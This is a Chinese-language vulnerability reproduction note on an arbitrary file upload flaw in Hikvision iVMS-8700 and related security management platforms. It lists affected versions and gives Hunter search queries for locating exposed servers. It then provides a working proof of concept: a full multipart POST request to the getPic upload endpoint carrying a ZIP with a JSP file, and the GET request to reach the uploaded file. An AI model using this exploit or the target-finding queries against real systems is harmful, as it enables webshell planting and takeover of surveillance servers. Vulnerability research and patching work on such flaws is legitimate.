# 海康威视iVMS-8700综合安防管理平台 getPic任意文件上传

# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。HIKVISION iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器。

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700
+ 海康威视综合安防系统iVMS-5200

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`||`web.body="/home/locationIndex.action"`

![1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0.png](./img/tT8w_7HnoiK20c6Y/1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0-200941.png)

+ 登录页面：

![1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111.png](./img/tT8w_7HnoiK20c6Y/1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111-915060.png)

![1702013270650-1660293d-021f-41a6-971a-543f1d8f45f9.png](./img/tT8w_7HnoiK20c6Y/1702013270650-1660293d-021f-41a6-971a-543f1d8f45f9-696099.png)

# 四、漏洞复现
1.生成一个压缩文件，目录结构如下。

[output.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/1622799/1709222237243-e5b9be7c-d2be-4914-a958-6913ff81ae5e.zip)

![1702013473674-dacbf15c-db9f-405d-aad7-89d64bc619da.png](./img/tT8w_7HnoiK20c6Y/1702013473674-dacbf15c-db9f-405d-aad7-89d64bc619da-856266.png)

![1702013924779-909124a7-12aa-4d40-93e8-a492fd759f30.png](./img/tT8w_7HnoiK20c6Y/1702013924779-909124a7-12aa-4d40-93e8-a492fd759f30-760894.png)



2. poc

```java
POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1
Accept-Encoding: gzip, deflate
User-Agent: MicroMessenger
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 1288
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="type"

ios
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="stc.ipa"

PK     z¦nW               test1/test/PK    xäVM(?jù        test1/test/.DS_StoreíÁJÃ@Eïº¥Ë|Ð?eBÀµÖJ]¤M(ê:¦ÿãO4¹¥-
¡Ýµô,Î÷&y$$ó fü=®¦6í`Æ{C¾î&k| Ä<îñó «ýÏmå_XîÔ_£.g£â½×ëä¡Üyåý¤¬&|X/ÿ¿ÃùÓ£òëÏÃkù)²ZÌÂ{B!v1\ßo ûÿÎé&Ú0nédk£3:§àö¶tB§´£3:§hÃûX:¡SÚÑCÑÃUëÖÿÇð		!.
øÂ6,×p¶iú ÷³îº±!NPK     ¦nW               test1/test/PetrelHD.app/PK    Ó¤nW¦ëd   j      test1/test/ceshi.jspÈM
Â@Ð«¸)L\R« ®EOôC#af¦íõû³|ïR¥Á9n1´ÍùtÜ·us¨©v?5ñM
Ar6}kü? vÿÿÞ×{¢ßøEÔU×PK     t¦nW               test1/PK?      z¦nW             $             test1/test/
         ó¯UùÚ                PK?     xäVM(?jù      $          )   test1/test/.DS_Store
          ¹,E®Ù                PK?      ¦nW             $       0   T  test1/test/PetrelHD.app/
         Ð!pùÚ                PK?     Ó¤nW¦ëd   j    $            test1/test/ceshi.jsp
         ö¨Ë|÷Ú                PK?      t¦nW             $             test1/
         *|{NùÚ                PK      ë  D    
--00content0boundary00--
```

![1702013640375-50b7b597-ac3d-47fc-9d0b-5a0f46eb0ebe.png](./img/tT8w_7HnoiK20c6Y/1702013640375-50b7b597-ac3d-47fc-9d0b-5a0f46eb0ebe-732434.png)

上传文件位置

```java
GET /msp/upload/ios/{filename}/test1/test/ceshi.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: MicroMessenger
Connection: close
Cookie: JSESSIONID=9534BB058003BD8772529364EF5E034E
Accept-Encoding: gzip, deflate
```

![1702013781703-4705dcab-3ba9-4e0a-a398-299f29f7f5e1.png](./img/tT8w_7HnoiK20c6Y/1702013781703-4705dcab-3ba9-4e0a-a398-299f29f7f5e1-998648.png)

![1702013887570-7fa4d933-987d-4d21-9949-797bf5b53a2d.png](./img/tT8w_7HnoiK20c6Y/1702013887570-7fa4d933-987d-4d21-9949-797bf5b53a2d-382674.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ore95852gqp60g63>